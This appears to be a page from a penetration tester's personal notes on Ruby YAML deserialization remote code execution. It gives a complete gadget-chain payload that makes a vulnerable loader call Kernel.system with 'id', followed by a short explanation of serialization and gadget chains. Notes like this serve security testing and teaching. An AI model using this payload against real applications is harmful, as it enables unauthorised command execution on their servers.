---
{"dg-publish":true,"permalink":"/cybersecurity/penetration-tester/remote-code-execution-through-yaml-deserialization/"}
---

[[Cybersecurity/Penetration Tester/Remote Code Execution\|RCE]] through YAML deserialization as described: [here](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)

```yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```



Even more in depth: [Ruby 2.X Universal RCE Deserialization Gadget Chain](https://www.elttam.com/blog/ruby-deserialization/#content)

`Serialization` is the process of converting an object into a series of bytes which can then be transferred over a network or stored on the filesystem or in a database. The stored bytes include all the relevant information required to reconstruct the original object. `Deserialization` is the process whereby the original object is reconstructed.

In Ruby, this is called marshalling and unmarshalling. The Marshal class has methods `dump` and `load` which can be used.

Deserialization of untrsuted data can be bad. Developers shouldn't assume that an attacker cannot view or tamper with serialized objects just because the format is opaque.

Code reuse attacks aer possible where pieces of already available code, called gadgets, are exectuted to perform an unwated action such as executing an arbitrary system command. Attackers can set instance variables to arbitrayr values or use a gadget to invoke a second gadget. This is called a gadget chain.





